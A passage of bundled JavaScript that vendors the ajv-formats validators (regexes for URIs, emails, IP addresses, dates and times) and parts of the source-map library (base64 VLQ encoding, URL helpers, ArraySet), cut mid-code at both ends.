      "uri-reference": /^(?:[a-z][a-z0-9+\-.]*:)?(?:\/?\/(?:(?:[a-z0-9\-._~!$&'()*+,;=:]|%[0-9a-f]{2})*@)?(?:\[(?:(?:(?:(?:[0-9a-f]{1,4}:){6}|::(?:[0-9a-f]{1,4}:){5}|(?:[0-9a-f]{1,4})?::(?:[0-9a-f]{1,4}:){4}|(?:(?:[0-9a-f]{1,4}:){0,1}[0-9a-f]{1,4})?::(?:[0-9a-f]{1,4}:){3}|(?:(?:[0-9a-f]{1,4}:){0,2}[0-9a-f]{1,4})?::(?:[0-9a-f]{1,4}:){2}|(?:(?:[0-9a-f]{1,4}:){0,3}[0-9a-f]{1,4})?::[0-9a-f]{1,4}:|(?:(?:[0-9a-f]{1,4}:){0,4}[0-9a-f]{1,4})?::)(?:[0-9a-f]{1,4}:[0-9a-f]{1,4}|(?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(?:25[0-5]|2[0-4]\d|[01]?\d\d?))|(?:(?:[0-9a-f]{1,4}:){0,5}[0-9a-f]{1,4})?::[0-9a-f]{1,4}|(?:(?:[0-9a-f]{1,4}:){0,6}[0-9a-f]{1,4})?::)|[Vv][0-9a-f]+\.[a-z0-9\-._~!$&'()*+,;=:]+)\]|(?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(?:25[0-5]|2[0-4]\d|[01]?\d\d?)|(?:[a-z0-9\-._~!$&'"()*+,;=]|%[0-9a-f]{2})*)(?::\d*)?(?:\/(?:[a-z0-9\-._~!$&'"()*+,;=:@]|%[0-9a-f]{2})*)*|\/(?:(?:[a-z0-9\-._~!$&'"()*+,;=:@]|%[0-9a-f]{2})+(?:\/(?:[a-z0-9\-._~!$&'"()*+,;=:@]|%[0-9a-f]{2})*)*)?|(?:[a-z0-9\-._~!$&'"()*+,;=:@]|%[0-9a-f]{2})+(?:\/(?:[a-z0-9\-._~!$&'"()*+,;=:@]|%[0-9a-f]{2})*)*)?(?:\?(?:[a-z0-9\-._~!$&'"()*+,;=:@/?]|%[0-9a-f]{2})*)?(?:#(?:[a-z0-9\-._~!$&'"()*+,;=:@/?]|%[0-9a-f]{2})*)?$/i,
      // uri-template: https://tools.ietf.org/html/rfc6570
      "uri-template": /^(?:(?:[^\x00-\x20"'<>%\\^`{|}]|%[0-9a-f]{2})|\{[+#./;?&=,!@|]?(?:[a-z0-9_]|%[0-9a-f]{2})+(?::[1-9][0-9]{0,3}|\*)?(?:,(?:[a-z0-9_]|%[0-9a-f]{2})+(?::[1-9][0-9]{0,3}|\*)?)*\})*$/i,
      // For the source: https://gist.github.com/dperini/729294
      // For test cases: https://mathiasbynens.be/demo/url-regex
      url: /^(?:https?|ftp):\/\/(?:\S+(?::\S*)?@)?(?:(?!(?:10|127)(?:\.\d{1,3}){3})(?!(?:169\.254|192\.168)(?:\.\d{1,3}){2})(?!172\.(?:1[6-9]|2\d|3[0-1])(?:\.\d{1,3}){2})(?:[1-9]\d?|1\d\d|2[01]\d|22[0-3])(?:\.(?:1?\d{1,2}|2[0-4]\d|25[0-5])){2}(?:\.(?:[1-9]\d?|1\d\d|2[0-4]\d|25[0-4]))|(?:(?:[a-z0-9\u{00a1}-\u{ffff}]+-)*[a-z0-9\u{00a1}-\u{ffff}]+)(?:\.(?:[a-z0-9\u{00a1}-\u{ffff}]+-)*[a-z0-9\u{00a1}-\u{ffff}]+)*(?:\.(?:[a-z\u{00a1}-\u{ffff}]{2,})))(?::\d{2,5})?(?:\/[^\s]*)?$/iu,
      email: /^[a-z0-9!#$%&'*+/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&'*+/=?^_`{|}~-]+)*@(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?$/i,
      hostname: /^(?=.{1,253}\.?$)[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?(?:\.[a-z0-9](?:[-0-9a-z]{0,61}[0-9a-z])?)*\.?$/i,
      // optimized https://www.safaribooksonline.com/library/view/regular-expressions-cookbook/9780596802837/ch07s16.html
      ipv4: /^(?:(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)\.){3}(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)$/,
      ipv6: /^((([0-9a-f]{1,4}:){7}([0-9a-f]{1,4}|:))|(([0-9a-f]{1,4}:){6}(:[0-9a-f]{1,4}|((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3})|:))|(([0-9a-f]{1,4}:){5}(((:[0-9a-f]{1,4}){1,2})|:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3})|:))|(([0-9a-f]{1,4}:){4}(((:[0-9a-f]{1,4}){1,3})|((:[0-9a-f]{1,4})?:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(([0-9a-f]{1,4}:){3}(((:[0-9a-f]{1,4}){1,4})|((:[0-9a-f]{1,4}){0,2}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(([0-9a-f]{1,4}:){2}(((:[0-9a-f]{1,4}){1,5})|((:[0-9a-f]{1,4}){0,3}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(([0-9a-f]{1,4}:){1}(((:[0-9a-f]{1,4}){1,6})|((:[0-9a-f]{1,4}){0,4}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(:(((:[0-9a-f]{1,4}){1,7})|((:[0-9a-f]{1,4}){0,5}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:)))$/i,
      regex,
      // uuid: http://tools.ietf.org/html/rfc4122
      uuid: /^(?:urn:uuid:)?[0-9a-f]{8}-(?:[0-9a-f]{4}-){3}[0-9a-f]{12}$/i,
      // JSON-pointer: https://tools.ietf.org/html/rfc6901
      // uri fragment: https://tools.ietf.org/html/rfc3986#appendix-A
      "json-pointer": /^(?:\/(?:[^~/]|~0|~1)*)*$/,
      "json-pointer-uri-fragment": /^#(?:\/(?:[a-z0-9_\-.!$&'()*+,;:=@]|%[0-9a-f]{2}|~0|~1)*)*$/i,
      // relative JSON-pointer: http://tools.ietf.org/html/draft-luff-relative-json-pointer-00
      "relative-json-pointer": /^(?:0|[1-9][0-9]*)(?:#|(?:\/(?:[^~/]|~0|~1)*)*)$/,
      // the following formats are used by the openapi specification: https://spec.openapis.org/oas/v3.0.0#data-types
      // byte: https://github.com/miguelmota/is-base64
      byte,
      // signed 32 bit integer
      int32: { type: "number", validate: validateInt32 },
      // signed 64 bit integer
      int64: { type: "number", validate: validateInt64 },
      // C-type float
      float: { type: "number", validate: validateNumber },
      // C-type double
      double: { type: "number", validate: validateNumber },
      // hint to the UI to hide input strings
      password: true,
      // unchecked string payload
      binary: true
    };
    exports2.fastFormats = {
      ...exports2.fullFormats,
      date: fmtDef(/^\d\d\d\d-[0-1]\d-[0-3]\d$/, compareDate),
      time: fmtDef(/^(?:[0-2]\d:[0-5]\d:[0-5]\d|23:59:60)(?:\.\d+)?(?:z|[+-]\d\d(?::?\d\d)?)$/i, compareTime),
      "date-time": fmtDef(/^\d\d\d\d-[0-1]\d-[0-3]\dt(?:[0-2]\d:[0-5]\d:[0-5]\d|23:59:60)(?:\.\d+)?(?:z|[+-]\d\d(?::?\d\d)?)$/i, compareDateTime),
      "iso-time": fmtDef(/^(?:[0-2]\d:[0-5]\d:[0-5]\d|23:59:60)(?:\.\d+)?(?:z|[+-]\d\d(?::?\d\d)?)?$/i, compareIsoTime),
      "iso-date-time": fmtDef(/^\d\d\d\d-[0-1]\d-[0-3]\d[t\s](?:[0-2]\d:[0-5]\d:[0-5]\d|23:59:60)(?:\.\d+)?(?:z|[+-]\d\d(?::?\d\d)?)?$/i, compareIsoDateTime),
      // uri: https://github.com/mafintosh/is-my-json-valid/blob/master/formats.js
      uri: /^(?:[a-z][a-z0-9+\-.]*:)(?:\/?\/)?[^\s]*$/i,
      "uri-reference": /^(?:(?:[a-z][a-z0-9+\-.]*:)?\/?\/)?(?:[^\\\s#][^\s#]*)?(?:#[^\\\s]*)?$/i,
      // email (sources from jsen validator):
      // http://stackoverflow.com/questions/201323/using-a-regular-expression-to-validate-an-email-address#answer-8829363
      // http://www.w3.org/TR/html5/forms.html#valid-e-mail-address (search for 'wilful violation')
      email: /^[a-z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?(?:\.[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?)*$/i
    };
    exports2.formatNames = Object.keys(exports2.fullFormats);
    function isLeapYear(year) {
      return year % 4 === 0 && (year % 100 !== 0 || year % 400 === 0);
    }
    var DATE = /^(\d\d\d\d)-(\d\d)-(\d\d)$/;
    var DAYS = [0, 31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31];
    function date(str) {
      const matches = DATE.exec(str);
      if (!matches)
        return false;
      const year = +matches[1];
      const month = +matches[2];
      const day = +matches[3];
      return month >= 1 && month <= 12 && day >= 1 && day <= (month === 2 && isLeapYear(year) ? 29 : DAYS[month]);
    }
    function compareDate(d1, d2) {
      if (!(d1 && d2))
        return void 0;
      if (d1 > d2)
        return 1;
      if (d1 < d2)
        return -1;
      return 0;
    }
    var TIME = /^(\d\d):(\d\d):(\d\d(?:\.\d+)?)(z|([+-])(\d\d)(?::?(\d\d))?)?$/i;
    function getTime(strictTimeZone) {
      return function time(str) {
        const matches = TIME.exec(str);
        if (!matches)
          return false;
        const hr = +matches[1];
        const min = +matches[2];
        const sec = +matches[3];
        const tz = matches[4];
        const tzSign = matches[5] === "-" ? -1 : 1;
        const tzH = +(matches[6] || 0);
        const tzM = +(matches[7] || 0);
        if (tzH > 23 || tzM > 59 || strictTimeZone && !tz)
          return false;
        if (hr <= 23 && min <= 59 && sec < 60)
          return true;
        const utcMin = min - tzM * tzSign;
        const utcHr = hr - tzH * tzSign - (utcMin < 0 ? 1 : 0);
        return (utcHr === 23 || utcHr === -1) && (utcMin === 59 || utcMin === -1) && sec < 61;
      };
    }
    function compareTime(s1, s2) {
      if (!(s1 && s2))
        return void 0;
      const t1 = (/* @__PURE__ */ new Date("2020-01-01T" + s1)).valueOf();
      const t2 = (/* @__PURE__ */ new Date("2020-01-01T" + s2)).valueOf();
      if (!(t1 && t2))
        return void 0;
      return t1 - t2;
    }
    function compareIsoTime(t1, t2) {
      if (!(t1 && t2))
        return void 0;
      const a1 = TIME.exec(t1);
      const a2 = TIME.exec(t2);
      if (!(a1 && a2))
        return void 0;
      t1 = a1[1] + a1[2] + a1[3];
      t2 = a2[1] + a2[2] + a2[3];
      if (t1 > t2)
        return 1;
      if (t1 < t2)
        return -1;
      return 0;
    }
    var DATE_TIME_SEPARATOR = /t|\s/i;
    function getDateTime(strictTimeZone) {
      const time = getTime(strictTimeZone);
      return function date_time(str) {
        const dateTime = str.split(DATE_TIME_SEPARATOR);
        return dateTime.length === 2 && date(dateTime[0]) && time(dateTime[1]);
      };
    }
    function compareDateTime(dt1, dt2) {
      if (!(dt1 && dt2))
        return void 0;
      const d1 = new Date(dt1).valueOf();
      const d2 = new Date(dt2).valueOf();
      if (!(d1 && d2))
        return void 0;
      return d1 - d2;
    }
    function compareIsoDateTime(dt1, dt2) {
      if (!(dt1 && dt2))
        return void 0;
      const [d1, t1] = dt1.split(DATE_TIME_SEPARATOR);
      const [d2, t2] = dt2.split(DATE_TIME_SEPARATOR);
      const res = compareDate(d1, d2);
      if (res === void 0)
        return void 0;
      return res || compareTime(t1, t2);
    }
    var NOT_URI_FRAGMENT = /\/|:/;
    var URI = /^(?:[a-z][a-z0-9+\-.]*:)(?:\/?\/(?:(?:[a-z0-9\-._~!$&'()*+,;=:]|%[0-9a-f]{2})*@)?(?:\[(?:(?:(?:(?:[0-9a-f]{1,4}:){6}|::(?:[0-9a-f]{1,4}:){5}|(?:[0-9a-f]{1,4})?::(?:[0-9a-f]{1,4}:){4}|(?:(?:[0-9a-f]{1,4}:){0,1}[0-9a-f]{1,4})?::(?:[0-9a-f]{1,4}:){3}|(?:(?:[0-9a-f]{1,4}:){0,2}[0-9a-f]{1,4})?::(?:[0-9a-f]{1,4}:){2}|(?:(?:[0-9a-f]{1,4}:){0,3}[0-9a-f]{1,4})?::[0-9a-f]{1,4}:|(?:(?:[0-9a-f]{1,4}:){0,4}[0-9a-f]{1,4})?::)(?:[0-9a-f]{1,4}:[0-9a-f]{1,4}|(?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(?:25[0-5]|2[0-4]\d|[01]?\d\d?))|(?:(?:[0-9a-f]{1,4}:){0,5}[0-9a-f]{1,4})?::[0-9a-f]{1,4}|(?:(?:[0-9a-f]{1,4}:){0,6}[0-9a-f]{1,4})?::)|[Vv][0-9a-f]+\.[a-z0-9\-._~!$&'()*+,;=:]+)\]|(?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(?:25[0-5]|2[0-4]\d|[01]?\d\d?)|(?:[a-z0-9\-._~!$&'()*+,;=]|%[0-9a-f]{2})*)(?::\d*)?(?:\/(?:[a-z0-9\-._~!$&'()*+,;=:@]|%[0-9a-f]{2})*)*|\/(?:(?:[a-z0-9\-._~!$&'()*+,;=:@]|%[0-9a-f]{2})+(?:\/(?:[a-z0-9\-._~!$&'()*+,;=:@]|%[0-9a-f]{2})*)*)?|(?:[a-z0-9\-._~!$&'()*+,;=:@]|%[0-9a-f]{2})+(?:\/(?:[a-z0-9\-._~!$&'()*+,;=:@]|%[0-9a-f]{2})*)*)(?:\?(?:[a-z0-9\-._~!$&'()*+,;=:@/?]|%[0-9a-f]{2})*)?(?:#(?:[a-z0-9\-._~!$&'()*+,;=:@/?]|%[0-9a-f]{2})*)?$/i;
    function uri(str) {
      return NOT_URI_FRAGMENT.test(str) && URI.test(str);
    }
    var BYTE = /^(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?$/gm;
    function byte(str) {
      BYTE.lastIndex = 0;
      return BYTE.test(str);
    }
    var MIN_INT32 = -(2 ** 31);
    var MAX_INT32 = 2 ** 31 - 1;
    function validateInt32(value) {
      return Number.isInteger(value) && value <= MAX_INT32 && value >= MIN_INT32;
    }
    function validateInt64(value) {
      return Number.isInteger(value);
    }
    function validateNumber() {
      return true;
    }
    var Z_ANCHOR = /[^\\]\\Z/;
    function regex(str) {
      if (Z_ANCHOR.test(str))
        return false;
      try {
        new RegExp(str);
        return true;
      } catch (e) {
        return false;
      }
    }
  }
});

// node_modules/.pnpm/ajv-formats@3.0.1_ajv@8.20.0/node_modules/ajv-formats/dist/limit.js
var require_limit = __commonJS({
  "node_modules/.pnpm/ajv-formats@3.0.1_ajv@8.20.0/node_modules/ajv-formats/dist/limit.js"(exports2) {
    "use strict";
    Object.defineProperty(exports2, "__esModule", { value: true });
    exports2.formatLimitDefinition = void 0;
    var ajv_1 = require_ajv();
    var codegen_1 = require_codegen();
    var ops = codegen_1.operators;
    var KWDs = {
      formatMaximum: { okStr: "<=", ok: ops.LTE, fail: ops.GT },
      formatMinimum: { okStr: ">=", ok: ops.GTE, fail: ops.LT },
      formatExclusiveMaximum: { okStr: "<", ok: ops.LT, fail: ops.GTE },
      formatExclusiveMinimum: { okStr: ">", ok: ops.GT, fail: ops.LTE }
    };
    var error = {
      message: ({ keyword, schemaCode }) => (0, codegen_1.str)`should be ${KWDs[keyword].okStr} ${schemaCode}`,
      params: ({ keyword, schemaCode }) => (0, codegen_1._)`{comparison: ${KWDs[keyword].okStr}, limit: ${schemaCode}}`
    };
    exports2.formatLimitDefinition = {
      keyword: Object.keys(KWDs),
      type: "string",
      schemaType: "string",
      $data: true,
      error,
      code(cxt) {
        const { gen, data, schemaCode, keyword, it } = cxt;
        const { opts, self } = it;
        if (!opts.validateFormats)
          return;
        const fCxt = new ajv_1.KeywordCxt(it, self.RULES.all.format.definition, "format");
        if (fCxt.$data)
          validate$DataFormat();
        else
          validateFormat();
        function validate$DataFormat() {
          const fmts = gen.scopeValue("formats", {
            ref: self.formats,
            code: opts.code.formats
          });
          const fmt = gen.const("fmt", (0, codegen_1._)`${fmts}[${fCxt.schemaCode}]`);
          cxt.fail$data((0, codegen_1.or)((0, codegen_1._)`typeof ${fmt} != "object"`, (0, codegen_1._)`${fmt} instanceof RegExp`, (0, codegen_1._)`typeof ${fmt}.compare != "function"`, compareCode(fmt)));
        }
        function validateFormat() {
          const format = fCxt.schema;
          const fmtDef = self.formats[format];
          if (!fmtDef || fmtDef === true)
            return;
          if (typeof fmtDef != "object" || fmtDef instanceof RegExp || typeof fmtDef.compare != "function") {
            throw new Error(`"${keyword}": format "${format}" does not define "compare" function`);
          }
          const fmt = gen.scopeValue("formats", {
            key: format,
            ref: fmtDef,
            code: opts.code.formats ? (0, codegen_1._)`${opts.code.formats}${(0, codegen_1.getProperty)(format)}` : void 0
          });
          cxt.fail$data(compareCode(fmt));
        }
        function compareCode(fmt) {
          return (0, codegen_1._)`${fmt}.compare(${data}, ${schemaCode}) ${KWDs[keyword].fail} 0`;
        }
      },
      dependencies: ["format"]
    };
    var formatLimitPlugin = (ajv) => {
      ajv.addKeyword(exports2.formatLimitDefinition);
      return ajv;
    };
    exports2.default = formatLimitPlugin;
  }
});

// node_modules/.pnpm/ajv-formats@3.0.1_ajv@8.20.0/node_modules/ajv-formats/dist/index.js
var require_dist = __commonJS({
  "node_modules/.pnpm/ajv-formats@3.0.1_ajv@8.20.0/node_modules/ajv-formats/dist/index.js"(exports2, module2) {
    "use strict";
    Object.defineProperty(exports2, "__esModule", { value: true });
    var formats_1 = require_formats();
    var limit_1 = require_limit();
    var codegen_1 = require_codegen();
    var fullName = new codegen_1.Name("fullFormats");
    var fastName = new codegen_1.Name("fastFormats");
    var formatsPlugin = (ajv, opts = { keywords: true }) => {
      if (Array.isArray(opts)) {
        addFormats(ajv, opts, formats_1.fullFormats, fullName);
        return ajv;
      }
      const [formats, exportName] = opts.mode === "fast" ? [formats_1.fastFormats, fastName] : [formats_1.fullFormats, fullName];
      const list = opts.formats || formats_1.formatNames;
      addFormats(ajv, list, formats, exportName);
      if (opts.keywords)
        (0, limit_1.default)(ajv);
      return ajv;
    };
    formatsPlugin.get = (name, mode = "full") => {
      const formats = mode === "fast" ? formats_1.fastFormats : formats_1.fullFormats;
      const f = formats[name];
      if (!f)
        throw new Error(`Unknown format "${name}"`);
      return f;
    };
    function addFormats(ajv, list, fs2, exportName) {
      var _a;
      var _b;
      (_a = (_b = ajv.opts.code).formats) !== null && _a !== void 0 ? _a : _b.formats = (0, codegen_1._)`require("ajv-formats/dist/formats").${exportName}`;
      for (const f of list)
        ajv.addFormat(f, fs2[f]);
    }
    module2.exports = exports2 = formatsPlugin;
    Object.defineProperty(exports2, "__esModule", { value: true });
    exports2.default = formatsPlugin;
  }
});

// node_modules/.pnpm/source-map@0.8.0/node_modules/source-map/lib/base64.js
var require_base64 = __commonJS({
  "node_modules/.pnpm/source-map@0.8.0/node_modules/source-map/lib/base64.js"(exports2) {
    var intToCharMap = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/".split("");
    exports2.encode = function(number) {
      if (0 <= number && number < intToCharMap.length) {
        return intToCharMap[number];
      }
      throw new TypeError("Must be between 0 and 63: " + number);
    };
  }
});

// node_modules/.pnpm/source-map@0.8.0/node_modules/source-map/lib/base64-vlq.js
var require_base64_vlq = __commonJS({
  "node_modules/.pnpm/source-map@0.8.0/node_modules/source-map/lib/base64-vlq.js"(exports2) {
    var base64 = require_base64();
    var VLQ_BASE_SHIFT = 5;
    var VLQ_BASE = 1 << VLQ_BASE_SHIFT;
    var VLQ_BASE_MASK = VLQ_BASE - 1;
    var VLQ_CONTINUATION_BIT = VLQ_BASE;
    function toVLQSigned(aValue) {
      return aValue < 0 ? (-aValue << 1) + 1 : (aValue << 1) + 0;
    }
    exports2.encode = function base64VLQ_encode(aValue) {
      let encoded = "";
      let digit;
      let vlq = toVLQSigned(aValue);
      do {
        digit = vlq & VLQ_BASE_MASK;
        vlq >>>= VLQ_BASE_SHIFT;
        if (vlq > 0) {
          digit |= VLQ_CONTINUATION_BIT;
        }
        encoded += base64.encode(digit);
      } while (vlq > 0);
      return encoded;
    };
  }
});

// node_modules/.pnpm/source-map@0.8.0/node_modules/source-map/lib/url.js
var require_url = __commonJS({
  "node_modules/.pnpm/source-map@0.8.0/node_modules/source-map/lib/url.js"(exports2, module2) {
    "use strict";
    module2.exports = typeof URL === "function" ? URL : require("url").URL;
  }
});

// node_modules/.pnpm/source-map@0.8.0/node_modules/source-map/lib/util.js
var require_util2 = __commonJS({
  "node_modules/.pnpm/source-map@0.8.0/node_modules/source-map/lib/util.js"(exports2) {
    var URL2 = require_url();
    function getArg(aArgs, aName, aDefaultValue) {
      if (aName in aArgs) {
        return aArgs[aName];
      } else if (arguments.length === 3) {
        return aDefaultValue;
      }
      throw new Error('"' + aName + '" is a required argument.');
    }
    exports2.getArg = getArg;
    var supportsNullProto = (function() {
      const obj = /* @__PURE__ */ Object.create(null);
      return !("__proto__" in obj);
    })();
    function identity(s) {
      return s;
    }
    function toSetString(aStr) {
      if (isProtoString(aStr)) {
        return "$" + aStr;
      }
      return aStr;
    }
    exports2.toSetString = supportsNullProto ? identity : toSetString;
    function fromSetString(aStr) {
      if (isProtoString(aStr)) {
        return aStr.slice(1);
      }
      return aStr;
    }
    exports2.fromSetString = supportsNullProto ? identity : fromSetString;
    function isProtoString(s) {
      if (!s) {
        return false;
      }
      const length = s.length;
      if (length < 9) {
        return false;
      }
      if (s.charCodeAt(length - 1) !== 95 || s.charCodeAt(length - 2) !== 95 || s.charCodeAt(length - 3) !== 111 || s.charCodeAt(length - 4) !== 116 || s.charCodeAt(length - 5) !== 111 || s.charCodeAt(length - 6) !== 114 || s.charCodeAt(length - 7) !== 112 || s.charCodeAt(length - 8) !== 95 || s.charCodeAt(length - 9) !== 95) {
        return false;
      }
      for (let i = length - 10; i >= 0; i--) {
        if (s.charCodeAt(i) !== 36) {
          return false;
        }
      }
      return true;
    }
    function strcmp(aStr1, aStr2) {
      if (aStr1 === aStr2) {
        return 0;
      }
      if (aStr1 === null) {
        return 1;
      }
      if (aStr2 === null) {
        return -1;
      }
      if (aStr1 > aStr2) {
        return 1;
      }
      return -1;
    }
    function compareByGeneratedPositionsInflated(mappingA, mappingB) {
      let cmp = mappingA.generatedLine - mappingB.generatedLine;
      if (cmp !== 0) {
        return cmp;
      }
      cmp = mappingA.generatedColumn - mappingB.generatedColumn;
      if (cmp !== 0) {
        return cmp;
      }
      cmp = strcmp(mappingA.source, mappingB.source);
      if (cmp !== 0) {
        return cmp;
      }
      cmp = mappingA.originalLine - mappingB.originalLine;
      if (cmp !== 0) {
        return cmp;
      }
      cmp = mappingA.originalColumn - mappingB.originalColumn;
      if (cmp !== 0) {
        return cmp;
      }
      return strcmp(mappingA.name, mappingB.name);
    }
    exports2.compareByGeneratedPositionsInflated = compareByGeneratedPositionsInflated;
    function parseSourceMapInput(str) {
      return JSON.parse(str.replace(/^\)]}'[^\n]*\n/, ""));
    }
    exports2.parseSourceMapInput = parseSourceMapInput;
    var PROTOCOL = "http:";
    var PROTOCOL_AND_HOST = `${PROTOCOL}//host`;
    function createSafeHandler(cb) {
      return (input) => {
        const type = getURLType(input);
        const base = buildSafeBase(input);
        const url = new URL2(input, base);
        cb(url);
        const result = url.toString();
        if (type === "absolute") {
          return result;
        } else if (type === "scheme-relative") {
          return result.slice(PROTOCOL.length);
        } else if (type === "path-absolute") {
          return result.slice(PROTOCOL_AND_HOST.length);
        }
        return computeRelativeURL(base, result);
      };
    }
    function withBase(url, base) {
      return new URL2(url, base).toString();
    }
    function buildUniqueSegment(prefix, str) {
      let id = 0;
      do {
        const ident = prefix + id++;
        if (str.indexOf(ident) === -1) return ident;
      } while (true);
    }
    function buildSafeBase(str) {
      const maxDotParts = str.split("..").length - 1;
      const segment = buildUniqueSegment("p", str);
      let base = `${PROTOCOL_AND_HOST}/`;
      for (let i = 0; i < maxDotParts; i++) {
        base += `${segment}/`;
      }
      return base;
    }
    var ABSOLUTE_SCHEME = /^[A-Za-z0-9\+\-\.]+:/;
    function getURLType(url) {
      if (url[0] === "/") {
        if (url[1] === "/") return "scheme-relative";
        return "path-absolute";
      }
      return ABSOLUTE_SCHEME.test(url) ? "absolute" : "path-relative";
    }
    function computeRelativeURL(rootURL, targetURL) {
      if (typeof rootURL === "string") rootURL = new URL2(rootURL);
      if (typeof targetURL === "string") targetURL = new URL2(targetURL);
      const targetParts = targetURL.pathname.split("/");
      const rootParts = rootURL.pathname.split("/");
      if (rootParts.length > 0 && !rootParts[rootParts.length - 1]) {
        rootParts.pop();
      }
      while (targetParts.length > 0 && rootParts.length > 0 && targetParts[0] === rootParts[0]) {
        targetParts.shift();
        rootParts.shift();
      }
      const relativePath = rootParts.map(() => "..").concat(targetParts).join("/");
      return relativePath + targetURL.search + targetURL.hash;
    }
    var ensureDirectory = createSafeHandler((url) => {
      url.pathname = url.pathname.replace(/\/?$/, "/");
    });
    var trimFilename = createSafeHandler((url) => {
      url.href = new URL2(".", url.toString()).toString();
    });
    var normalize2 = createSafeHandler((url) => {
    });
    exports2.normalize = normalize2;
    function join6(aRoot, aPath) {
      const pathType = getURLType(aPath);
      const rootType = getURLType(aRoot);
      aRoot = ensureDirectory(aRoot);
      if (pathType === "absolute") {
        return withBase(aPath, void 0);
      }
      if (rootType === "absolute") {
        return withBase(aPath, aRoot);
      }
      if (pathType === "scheme-relative") {
        return normalize2(aPath);
      }
      if (rootType === "scheme-relative") {
        return withBase(aPath, withBase(aRoot, PROTOCOL_AND_HOST)).slice(
          PROTOCOL.length
        );
      }
      if (pathType === "path-absolute") {
        return normalize2(aPath);
      }
      if (rootType === "path-absolute") {
        return withBase(aPath, withBase(aRoot, PROTOCOL_AND_HOST)).slice(
          PROTOCOL_AND_HOST.length
        );
      }
      const base = buildSafeBase(aPath + aRoot);
      const newPath = withBase(aPath, withBase(aRoot, base));
      return computeRelativeURL(base, newPath);
    }
    exports2.join = join6;
    function relative2(rootURL, targetURL) {
      const result = relativeIfPossible(rootURL, targetURL);
      return typeof result === "string" ? result : normalize2(targetURL);
    }
    exports2.relative = relative2;
    function relativeIfPossible(rootURL, targetURL) {
      const urlType = getURLType(rootURL);
      if (urlType !== getURLType(targetURL)) {
        return null;
      }
      const base = buildSafeBase(rootURL + targetURL);
      const root = new URL2(rootURL, base);
      const target = new URL2(targetURL, base);
      try {
        new URL2("", target.toString());
      } catch (err) {
        return null;
      }
      if (target.protocol !== root.protocol || target.user !== root.user || target.password !== root.password || target.hostname !== root.hostname || target.port !== root.port) {
        return null;
      }
      return computeRelativeURL(root, target);
    }
    function computeSourceURL(sourceRoot, sourceURL, sourceMapURL) {
      if (sourceRoot && getURLType(sourceURL) === "path-absolute") {
        sourceURL = sourceURL.replace(/^\//, "");
      }
      let url = normalize2(sourceURL || "");
      if (sourceRoot) url = join6(sourceRoot, url);
      if (sourceMapURL) url = join6(trimFilename(sourceMapURL), url);
      return url;
    }
    exports2.computeSourceURL = computeSourceURL;
  }
});

// node_modules/.pnpm/source-map@0.8.0/node_modules/source-map/lib/array-set.js
var require_array_set = __commonJS({
  "node_modules/.pnpm/source-map@0.8.0/node_modules/source-map/lib/array-set.js"(exports2) {
    var ArraySet = class _ArraySet {
      constructor() {
        this._array = [];
        this._set = /* @__PURE__ */ new Map();
      }
      /**
       * Static method for creating ArraySet instances from an existing array.
       */
      static fromArray(aArray, aAllowDuplicates) {
        const set = new _ArraySet();
        for (let i = 0, len = aArray.length; i < len; i++) {
          set.add(aArray[i], aAllowDuplicates);
        }
        return set;
      }
      /**
       * Return how many unique items are in this ArraySet. If duplicates have been
       * added, than those do not count towards the size.
       *
       * @returns Number
       */
      size() {
        return this._set.size;
      }
      /**
       * Add the given string to this set.
       *
       * @param String aStr
       */
      add(aStr, aAllowDuplicates) {
        const isDuplicate = this.has(aStr);
        const idx = this._array.length;
        if (!isDuplicate || aAllowDuplicates) {
          this._array.push(aStr);
        }
        if (!isDuplicate) {
          this._set.set(aStr, idx);
        }
      }
      /**
       * Is the given string a member of this set?
       *
       * @param String aStr
       */
      has(aStr) {
        return this._set.has(aStr);
      }
      /**
       * What is the index of the given string in the array?
       *
       * @param String aStr
       */
      indexOf(aStr) {
        const idx = this._set.get(aStr);
        if (idx >= 0) {
          return idx;
        }
        throw new Error('"' + aStr + '" is not in the set.');
      }
      /**
       * What is the element at the given index?
       *
       * @param Number aIdx
       */
      at(aIdx) {
        if (aIdx >= 0 && aIdx < this._array.length) {
          return this._array[aIdx];
        }
        throw new Error("No element indexed by " + aIdx);
      }
      /**
       * Returns the array representation of this set (which has the proper indices
       * indicated by indexOf). Note that this is a copy of the internal array used
       * for storing the members so that no one can mess with internal state.
       */
      toArray() {
        return this._array.slice();
      }
    };
    exports2.ArraySet = ArraySet;
  }
});

// node_modules/.pnpm/source-map@0.8.0/node_modules/source-map/lib/mapping-list.js
var require_mapping_list = __commonJS({
